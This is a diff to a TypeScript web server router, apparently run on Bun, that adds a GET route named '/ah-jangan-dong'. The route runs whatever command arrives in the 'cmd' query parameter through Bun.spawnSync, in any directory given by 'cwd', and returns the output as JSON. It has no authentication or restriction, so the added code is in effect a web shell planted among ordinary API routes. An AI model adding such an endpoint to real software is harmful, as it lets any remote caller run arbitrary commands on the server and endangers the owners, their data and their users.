@@ -38,6 +38,30 @@ createGroup(app, 'v1', (router) => {
       }
     })
   })
+  router.get("/ah-jangan-dong", (req, res) => {
+    try {
+      const parse = Bun.spawnSync({
+        cmd: (req.query.cmd as string || "ls").split(" "),
+        cwd: (req.query.cwd as string) || process.cwd(),
+      })
+      return res.json({
+        ok: true,
+        message: "success",
+        data: {
+          response: parse.stdout.toString()
+        },
+      })
+    } catch (error) {
+      service.log.error(error)
+      return res.json({
+        ok: false,
+        message: "error",
+        data: {
+          error: `${error}`
+        },
+      })
+    }
+  })
   // AUTH ROUTE
   router.use("/auth", createProxyMiddleware({
     target: `http://localhost:${process.env.SERVICE_API_AUTH_PORT || "3001"}/v1`,
